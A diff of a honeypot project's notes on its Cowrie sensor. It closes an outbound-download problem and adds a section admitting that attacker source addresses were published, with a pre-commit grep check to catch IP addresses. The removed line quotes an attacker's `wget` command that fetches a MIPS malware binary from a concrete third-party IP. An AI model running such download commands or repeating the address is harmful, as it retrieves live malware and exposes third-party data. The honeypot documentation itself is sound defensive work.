@@ -80,7 +80,7 @@ matters is unchanged and is stated precisely: **nothing in this project now conn
 ## The outbound download problem — found and closed, 29 September 2026
 
 **What was wrong.** Cowrie does not fake `wget`, `curl` and `tftp`. When an
-attacker types `wget http://45.32.215.222/iran.mips`, Cowrie really fetches that
+attacker types `wget http://<payload-host>/iran.mips`, Cowrie really fetches that
 file and stores it under its SHA-256. That is deliberate honeypot behaviour and
 it is how malware samples are collected — but it means the sensor opened
 outbound connections to attacker-controlled infrastructure, which is precisely
@@ -255,6 +255,58 @@ history-inclusive pre-commit check in the second.
 
 A rules-of-engagement document that has never been violated is usually one nobody
 has audited.
+
+## Individual addresses were in the findings notes — the third self-violation
+
+*Found 6 October 2026, by reading every file in the repository against every
+other; corrected the same evening.*
+
+The *Personal data* table above says *"No individual address appears in this
+repository or in the presentation."* From 25 September to 6 October 2026 that
+was false. `docs/first-contact.md` and `docs/first-weekend.md` named seven
+source addresses in full — the timeline of the first forty minutes, the two
+hosts that ran one script, the three sources that asked for a relay — plus the
+relay's destination, and three documents quoted the host a payload was fetched
+from. Nine third-party addresses, published for eleven days, in a repository
+whose own README said no raw source address is published.
+
+Nobody was identified and nothing was done with the addresses; they were there
+because findings notes are easier to write with the real value than with a
+label. That is the same shape as the first two violations: a statement about
+what the project does, written as an intention, never checked against what the
+files contained.
+
+**What was done.** Every address was replaced with a stable label —
+`<source-1>` to `<source-7>`, `<relay-destination>`, `<payload-host>` — so the
+behaviour described stays readable and the identity does not. The mapping lives
+in the operator's private build record, with the host address and the
+fingerprints. **The repository's history still holds the addresses**, for the
+same reason given above for the sensor's own address: a rewrite would need push
+credentials on a machine that deliberately has none, would not undo publication,
+and a mitigation that looks complete and is not is worse than one that is
+honestly partial. The window is recorded instead.
+
+**What was decided against.** Amending the table to permit publishing the
+addresses of attacking infrastructure. That is common threat-intelligence
+practice and would have been defensible — most of these are compromised
+machines, not people — but it would have changed the rule to fit the breach,
+and the *Personal data* table was written for an operator in Germany with a
+machine in Austria, where an address is personal data whatever is behind it.
+When the document and the files disagree, the files change.
+
+The pre-commit check gains a line, which is the only control here that does not
+depend on remembering:
+
+```
+git grep -nE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' -- '*.md' | grep -vE '127\.0\.0\.1|0\.0\.0\.0|172\.16\.0\.4|198\.51\.100\.|203\.0\.113\.'
+```
+
+It must print nothing. The decks are checked at the 9 December freeze, which is
+the next time anything on a slide is edited.
+
+Three rules in this document have now been broken by the project itself. The
+honest summary a few sections up said two; it is left as written, with this
+section as its correction.
 
 ## Analysing what the decoys captured
 
